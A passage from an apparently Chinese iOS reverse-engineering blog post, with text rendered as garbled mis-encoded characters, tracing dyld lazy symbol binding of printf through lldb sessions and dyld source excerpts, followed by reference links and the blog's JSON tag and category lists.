æ®µå»åšç¬¦å·ç»‘å®šå·¥ä½œï¼š 1234(lldb) image lookup -va $x1 Address: main[0x000000010000c030] (main.__LINKEDIT + 48) Summary: Module: file = \"/private/var/tmp/main\", arch = \"arm64\" 3. ImageLoaderMachO::getLazyBindingInfoæ ¹æ®ä¸åŒçš„opcodeï¼Œèµ°ä¸åŒåˆ†æ”¯ï¼š 12345678910111213if ( lazyBindingInfoOffset &gt; (lazyInfoEnd-lazyInfoStart) ) return false; bool done = false; const uint8_t* p = &amp;lazyInfoStart[lazyBindingInfoOffset]; while ( !done &amp;&amp; (p &lt; lazyInfoEnd) ) { uint8_t immediate = *p &amp; BIND_IMMEDIATE_MASK; uint8_t opcode = *p &amp; BIND_OPCODE_MASK; ++p; switch (opcode) { }.... è·å–ç›®æ ‡ç¬¦å·ç›¸å…³çš„ä¿¡æ¯ : 1&amp;segIndex, &amp;segOffset, &amp;libraryOrdinal, &amp;symbolName, &amp;doneAfterBind ç„¶åæ ¹æ®è¿™äº›ä¿¡æ¯ï¼Œè·å–è¯¥ç¬¦å·çš„åœ°å€ï¼š 1uintptr_t address = segActualLoadAddress(segIndex) + segOffset; 12345678910111213// dyldç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œå®ç°çš„å‡½æ•°æœ‰äº›å·®åˆ«ï¼Œä½†æ˜¯æœ¬è´¨æ˜¯ä¸€æ ·çš„(lldb) nProcess 1465 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over frame #0: 0x0000000100fe5ee4 dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(unsigned int, ImageLoader::LinkContext const&amp;, void (*)(), void (*)()) + 256dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:-&gt; 0x100fe5ee4 &lt;+256&gt;: mov x26, x0 0x100fe5ee8 &lt;+260&gt;: mov x0, x20 0x100fe5eec &lt;+264&gt;: bl 0x100fe1fb0 ; ImageLoaderMachO::imageBaseAddress() const 0x100fe5ef0 &lt;+268&gt;: mov x1, x0Target 0: (main) stopped.(lldb) re re x0 x0 = 0x00000001d860e14c libsystem_c.dylib`printf æ‰§è¡Œç¬¦å·ç»‘å®šï¼š 1result = bindAt(context, this, address, BIND_TYPE_POINTER, symbolName, 0, 0, libraryOrdinal,NULL, \"lazy \", patcher, NULL, true); 1234567891011121314151617181920212223// è°ƒè¯•ï¼šframe #0: 0x0000000100fe5f28 dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(unsigned int, ImageLoader::LinkContext const&amp;, void (*)(), void (*)()) + 324dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:-&gt; 0x100fe5f28 &lt;+324&gt;: bl 0x100fe0664 ; ImageLoaderMachO::bindLocation(ImageLoader::LinkContext const&amp;, unsigned long, unsigned long, unsigned long, unsigned char, char const*, long, char const*, char const*, char const*, ImageLoaderMachO::ExtraBindData*, unsigned long) 0x100fe5f2c &lt;+328&gt;: ldrb w8, [sp, #0x27] 0x100fe5f30 &lt;+332&gt;: ldrb w9, [x21, #0x139] 0x100fe5f34 &lt;+336&gt;: orr w8, w8, w9Target 0: (main) stopped.(lldb) re re x0 x0 = 0x00000001010235e0 dyld::gLinkContext(lldb) re re x1 x1 = 0x0000000100000000(lldb) re re x2 x2 = 0x0000000100fb8020 (void *)0x0000000100fb7f98(lldb) re re x3 x3 = 0x00000001d860e14c libsystem_c.dylib`printf(lldb) re re x4 x4 = 0x0000000000000001(lldb) re re x5 x5 = 0x0000000100fbc04e(lldb) re re x6 x6 = 0x0000000000000000(lldb) æ‰§è¡Œä¹‹å: 1234567891011121314151617(lldb) nProcess 1465 stopped* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over frame #0: 0x0000000100fe5f2c dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(unsigned int, ImageLoader::LinkContext const&amp;, void (*)(), void (*)()) + 328dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:-&gt; 0x100fe5f2c &lt;+328&gt;: ldrb w8, [sp, #0x27] 0x100fe5f30 &lt;+332&gt;: ldrb w9, [x21, #0x139] 0x100fe5f34 &lt;+336&gt;: orr w8, w8, w9 0x100fe5f38 &lt;+340&gt;: cbz w8, 0x100fe5e4c ; &lt;+104&gt;Target 0: (main) stopped.(lldb) x/gx 0x0000000100fb80200x100fb8020: 0x00000001d860e14c(lldb) image lookup -va 0x00000001d860e14c Address: libsystem_c.dylib[0x00000001809a614c] (libsystem_c.dylib.__TEXT.__text + 263364) Summary: libsystem_c.dylib`printf Module: file = \"/Users/muhe/Library/Developer/Xcode/iOS DeviceSupport/12.2 (16E227)/Symbols/usr/lib/system/libsystem_c.dylib\", arch = \"arm64\" Symbol: id = {0x00000617}, range = [0x00000001d860e14c-0x00000001d860e1a8), name=\"printf\" å¯ä»¥çœ‹åˆ°ç¬¦å·åœ°å€å·²ç»è¢«å†™è¿‡å»äº†(0x0000000100fb8020) è‡³æ­¤ï¼Œç¬¦å·ç»‘å®šè¿‡ç¨‹å®Œæˆã€‚ referenceã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»-é“¾æ¥ã€è£…è½½å’Œåº“ã€‹ https://juejin.cn/post/6844903912147795982 https://juejin.cn/post/6844903922654511112#heading-10 https://bbs.pediy.com/thread-263907.htm https://iosre.com/t/ios-12-4-killed-9/15633","link":"/2021/07/14/iOS-RE-4-beginners-2/"}],"tags":[{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"writeup","slug":"writeup","link":"/tags/writeup/"},{"name":"Adobe","slug":"Adobe","link":"/tags/Adobe/"},{"name":"PoC","slug":"PoC","link":"/tags/PoC/"},{"name":"linux kernel","slug":"linux-kernel","link":"/tags/linux-kernel/"},{"name":"UaF","slug":"UaF","link":"/tags/UaF/"},{"name":"Apple","slug":"Apple","link":"/tags/Apple/"},{"name":"MacOS","slug":"MacOS","link":"/tags/MacOS/"},{"name":"ctf writeup","slug":"ctf-writeup","link":"/tags/ctf-writeup/"},{"name":"ç¼–è¯‘åŸç†","slug":"ç¼–è¯‘åŸç†","link":"/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"},{"name":"Antlr","slug":"Antlr","link":"/tags/Antlr/"},{"name":"Adobe Reader","slug":"Adobe-Reader","link":"/tags/Adobe-Reader/"},{"name":"1day","slug":"1day","link":"/tags/1day/"},{"name":"IDA","slug":"IDA","link":"/tags/IDA/"},{"name":"Bindiff","slug":"Bindiff","link":"/tags/Bindiff/"},{"name":"CTF Writeup","slug":"CTF-Writeup","link":"/tags/CTF-Writeup/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"æ¼æ´åˆ†æ","slug":"æ¼æ´åˆ†æ","link":"/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"webkit","slug":"webkit","link":"/tags/webkit/"},{"name":"macOS","slug":"macOS","link":"/tags/macOS/"},{"name":"Adobe Acrobat Reader","slug":"Adobe-Acrobat-Reader","link":"/tags/Adobe-Acrobat-Reader/"},{"name":"IE","slug":"IE","link":"/tags/IE/"},{"name":"office","slug":"office","link":"/tags/office/"},{"name":"vbs","slug":"vbs","link":"/tags/vbs/"},{"name":"v8","slug":"v8","link":"/tags/v8/"},{"name":"exploit","slug":"exploit","link":"/tags/exploit/"},{"name":"chrome","slug":"chrome","link":"/tags/chrome/"},{"name":"CDP","slug":"CDP","link":"/tags/CDP/"},{"name":"Cisco","slug":"Cisco","link":"/tags/Cisco/"},{"name":"life","slug":"life","link":"/tags/life/"},{"name":"PANDA","slug":"PANDA","link":"/tags/PANDA/"},{"name":"RE","slug":"RE","link":"/tags/RE/"},{"name":"Study","slug":"Study","link":"/tags/Study/"},{"name":"C","slug":"C","link":"/tags/C/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"å…¶ä»–","slug":"å…¶ä»–","link":"/tags/%E5%85%B6%E4%BB%96/"},{"name":"ç¯å¢ƒé…ç½®","slug":"ç¯å¢ƒé…ç½®","link":"/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"å·¥å…·","slug":"å·¥å…·","link":"/tags/%E5%B7%A5%E5%85%B7/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"Snell","slug":"Snell","link":"/tags/Snell/"},{"name":"Surge","slug":"Surge","link":"/tags/Surge/"},{"name":"Symbolic Execution","slug":"Symbolic-Execution","link":"/tags/Symbolic-Execution/"},{"name":"æ„Ÿæƒ³","slug":"æ„Ÿæƒ³","link":"/tags/%E6%84%9F%E6%83%B3/"},{"name":"vuln analysis","slug":"vuln-analysis","link":"/tags/vuln-analysis/"},{"name":"uaf","slug":"uaf","link":"/tags/uaf/"},{"name":"study","slug":"study","link":"/tags/study/"},{"name":"unicorn engine","slug":"unicorn-engine","link":"/tags/unicorn-engine/"},{"name":"tools","slug":"tools","link":"/tags/tools/"},{"name":"Webkit","slug":"Webkit","link":"/tags/Webkit/"},{"name":"windows kernel","slug":"windows-kernel","link":"/tags/windows-kernel/"},{"name":"angr","slug":"angr","link":"/tags/angr/"},{"name":"compiler","slug":"compiler","link":"/tags/compiler/"},{"name":"fuzz","slug":"fuzz","link":"/tags/fuzz/"},{"name":"peach","slug":"peach","link":"/tags/peach/"},{"name":"winafl","slug":"winafl","link":"/tags/winafl/"},{"name":"gdb","slug":"gdb","link":"/tags/gdb/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"IPC","slug":"IPC","link":"/tags/IPC/"},{"name":"Mach","slug":"Mach","link":"/tags/Mach/"},{"name":"ESXi","slug":"ESXi","link":"/tags/ESXi/"},{"name":"debug","slug":"debug","link":"/tags/debug/"},{"name":"mips","slug":"mips","link":"/tags/mips/"},{"name":"wargame","slug":"wargame","link":"/tags/wargame/"},{"name":"ret 2 dl-resolve","slug":"ret-2-dl-resolve","link":"/tags/ret-2-dl-resolve/"},{"name":"env","slug":"env","link":"/tags/env/"},{"name":"config","slug":"config","link":"/tags/config/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"Tools","slug":"Tools","link":"/tags/Tools/"},{"name":"Frida","slug":"Frida","link":"/tags/Frida/"},{"name":"CVE","slug":"CVE","link":"/tags/CVE/"},{"name":"android","slug":"android","link":"/tags/android/"},{"name":"Compilers","slug":"Compilers","link":"/tags/Compilers/"},{"name":"paper","slug":"paper","link":"/tags/paper/"},{"name":"æ„Ÿæ‚Ÿ","slug":"æ„Ÿæ‚Ÿ","link":"/tags/%E6%84%9F%E6%82%9F/"},{"name":"LLVM","slug":"LLVM","link":"/tags/LLVM/"},{"name":"frida","slug":"frida","link":"/tags/frida/"},{"name":"glibcå†…å­˜ç®¡ç†","slug":"glibcå†…å­˜ç®¡ç†","link":"/tags/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"name":"shellcode","slug":"shellcode","link":"/tags/shellcode/"},{"name":"XNU","slug":"XNU","link":"/tags/XNU/"},{"name":"CodeQL","slug":"CodeQL","link":"/tags/CodeQL/"},{"name":"iOS","slug":"iOS","link":"/tags/iOS/"},{"name":"Chrome","slug":"Chrome","link":"/tags/Chrome/"},{"name":"é€†å‘","slug":"é€†å‘","link":"/tags/%E9%80%86%E5%90%91/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"POC","slug":"POC","link":"/categories/POC/"},{"name":"å­¦ä¹ è®°å½•","slug":"å­¦ä¹ è®°å½•","link":"/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"name":"æ¼æ´åˆ†æ","slug":"æ¼æ´åˆ†æ","link":"/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"å·¥å…·","slug":"å·¥å…·","link":"/categories/%E5%B7%A5%E5%85%B7/"},{"name":"PoC","slug":"PoC","link":"/categories/PoC/"},{"name":"é…ç½®ç¯å¢ƒè¸©å‘","slug":"é…ç½®ç¯å¢ƒè¸©å‘","link":"/categories/%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E8%B8%A9%E5%9D%91/"},{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","link":"/categories/%E7%BC%96%E7%A8%8B/"},{"name":"ç¯å¢ƒé…ç½®è¸©å‘","slug":"ç¯å¢ƒé…ç½®è¸©å‘","link":"/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/"},{"name":"å…¶ä»–","slug":"å…¶ä»–","link":"/categories/%E5%85%B6%E4%BB%96/"},{"name":"exploit","slug":"exploit","link":"/categories/exploit/"},{"name":"Fuzz","slug":"Fuzz","link":"/categories/Fuzz/"},{"name":"ç¯å¢ƒé…ç½®","slug":"ç¯å¢ƒé…ç½®","link":"/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"è®ºæ–‡é˜…è¯»","slug":"è®ºæ–‡é˜…è¯»","link":"/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","link":"/categories/%E7%AC%94%E8%AE%B0/"},{"name":"iOS","slug":"iOS","link":"/categories/iOS/"},{"name":"XNU","slug":"XNU","link":"/categories/XNU/"}]}